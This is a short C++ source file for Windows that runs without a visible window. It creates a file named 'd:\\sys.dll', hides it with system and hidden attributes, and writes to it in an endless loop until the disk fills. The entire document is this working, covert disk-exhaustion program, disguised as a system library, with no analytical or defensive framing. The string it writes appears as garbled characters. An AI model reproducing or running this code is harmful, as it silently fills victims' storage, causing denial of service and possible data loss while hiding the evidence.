#pragma comment(linker, "/subsystem:\"windows\"   /entry:\"mainCRTStartup\"")  
#include<fstream>
#include<iostream>
#include<Windows.h>
#include<string>
using namespace std;
int main(){
	ofstream Cout("d:\\sys.dll",ios::app);
	system("attrib +h +s d:\\sys.dll");
	for(;;){
		Cout<<"�������ȱ�����~~";
	}
	return 0;
}